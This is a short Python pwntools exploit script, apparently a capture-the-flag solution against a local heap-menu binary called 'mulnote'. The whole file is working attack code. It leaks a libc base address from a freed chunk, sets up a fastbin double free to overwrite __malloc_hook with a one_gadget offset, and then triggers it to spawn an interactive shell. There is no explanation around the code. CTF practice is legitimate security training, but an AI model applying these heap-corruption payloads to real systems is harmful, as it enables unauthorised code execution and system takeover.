from pwn import *
p=process("./mulnote")
libc=ELF("/libc64.so")

def c(size,con):
    p.sendlineafter(">","C")
    p.sendlineafter(">",str(size))
    p.sendafter(">",con)

def r(idx):
    p.sendlineafter(">","R")
    p.sendlineafter(">",str(idx))

def s():
    p.sendlineafter(">","S")

c(0x100,"1\n")
c(0x10,"2\n")
r(0)
c(0x10,"1"*8)
s()
p.recvuntil('1'*8)
libc.address=u64(p.recv(6)+"\x00\x00")-0x3c4c78
success(hex(libc.address))
# print hexdump(p.recv())
c(0x68,'1'*0x68) # 3
c(0x68,'2'*0x68) # 4
c(0x68,"3"*0x68)
r(0)
# context.log_level='debug'
s()
#  print p.recv()
r(3)
r(5)
r(3)
c(0x68,p64(libc.address+0x3c4aed))
c(0x68,'1\n')
c(0x68,'1\n')
c(0x68,'aaa'+p64(0)*2+p64(libc.address+0x45216))
p.sendlineafter(">","C")
p.sendlineafter(">","/bin/sh")
p.interactive()
pause()
